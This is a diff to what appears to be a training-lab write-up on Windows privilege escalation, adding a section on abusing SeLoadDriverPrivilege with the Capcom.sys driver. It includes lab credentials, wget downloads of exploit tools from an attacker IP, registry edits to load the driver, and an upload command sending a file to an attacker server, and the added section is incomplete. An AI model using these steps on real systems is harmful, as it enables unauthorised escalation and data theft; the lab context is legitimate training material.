@@ -31,6 +31,9 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 Results: powershell_ise.exe
 
 
+
+
+
 **What non-default privilege does the htb-student user have?**
 
 ```powershell
@@ -300,3 +303,40 @@ type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
 ```
 
 Results: Dll_abus3_ftw!  
+
+**RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.**
+
+```
+xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
+
+# Generating the 
+
+wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe
+
+wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys
+
+
+wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe
+
+mkdir c:\test\
+
+copy Capcom.sys c:\test\Capcom.sys
+
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys" /f
+
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 /f
+
+# Verify Driver is not Loaded
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+
+
+
+
+
+
+
+
+Invoke-FileUpload -Uri http://10.10.14.39:8000/upload -File C:\Tools\lala\drivers\etc\hosts
+
+
